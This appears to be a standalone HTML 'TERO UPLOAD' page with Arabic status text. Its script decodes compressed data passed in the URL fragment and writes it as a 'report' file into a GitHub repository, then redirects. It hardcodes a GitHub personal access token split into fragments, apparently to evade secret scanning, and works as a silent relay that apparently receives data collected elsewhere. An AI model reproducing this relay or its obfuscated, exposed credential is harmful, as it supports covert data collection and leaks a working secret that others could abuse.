<!DOCTYPE html>
<html><head><meta charset="utf-8"><title>TERO UPLOAD</title>
<style>body{background:#000;color:#0f0;text-align:center;padding:150px;font-family:Arial;}</style>
</head><body>
<h1 style="color:#e74c3c;font-size:60px;">tero</h1>
<div id="status">جاري الرفع...</div>

<script src="https://cdn.jsdelivr.net/npm/zlibjs@0.3.2/bin/zlib.min.js"></script>
<script>
const TOKEN = ['github_pat_11A3ZKARI0','Q8CbII0GvNSt_','hv6TMKWiNaMucDwhvOE4tNh9aBtjIB7VkTMj7xnjra','276EGSZZQGRkTKn8W'].join('');
const API = "https://api.github.com/repos/youssefmettwaly/tero-report/contents/reports";

if (location.hash) {
  const b64 = decodeURIComponent(location.hash.substring(1));
  const compressed = Uint8Array.from(atob(b64), c => c.charCodeAt(0));
  const decompressed = Zlib.Inflate.inflate(compressed).map(b => String.fromCharCode(b)).join('');
  
  const filename = `report_${new Date().toISOString().replace(/[:.]/g,'-')}.txt`;
  const content = btoa(unescape(encodeURIComponent(decompressed)));
  
  fetch(`${API}/${filename}`, {
    method: 'PUT',
    headers: {
      'Authorization': 'token ' + TOKEN,
      'Content-Type': 'application/json'
    },
    body: JSON.stringify({
      message: "New report",
      content: content,
      branch: "main"
    })
  })
  .then(r => r.json())
  .then(res => {
    document.getElementById('status').innerHTML = "<h1 style='color:#0f0'>تم الرفع بنجاح!</h1>";
    setTimeout(() => location.href = "https://youssefmettwaly.github.io/tero-report/index.html", 2000);
  })
  .catch(() => document.getElementById('status').innerHTML = "فشل الرفع");
}
</script>
</body></html>
